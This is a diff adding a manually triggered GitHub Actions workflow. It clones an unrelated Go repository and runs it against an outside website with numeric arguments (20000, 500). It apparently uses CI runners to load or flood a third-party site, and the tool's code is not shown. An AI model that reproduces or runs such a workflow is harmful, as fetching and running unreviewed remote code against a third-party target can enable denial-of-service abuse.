@@ -1,0 +1,30 @@
+name: test
+
+on: [workflow_dispatch]
+
+jobs:
+  clone-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout current repository
+      uses: actions/checkout@v4
+
+    - name: Clone target repository
+      run: git clone https://github.com/16ssarmy/XXX.git ./target-repo
+
+    - name: Set up Go
+      uses: actions/setup-go@v5
+      with:
+        go-version: '1.24'
+        cache: true
+
+    - name: Download Go modules
+      run: |
+        cd ./target-repo
+        go mod download
+
+    - name: Run Go application
+      run: |
+        cd ./target-repo
+        go run main.go https://www.warezlab.net/ 20000 500
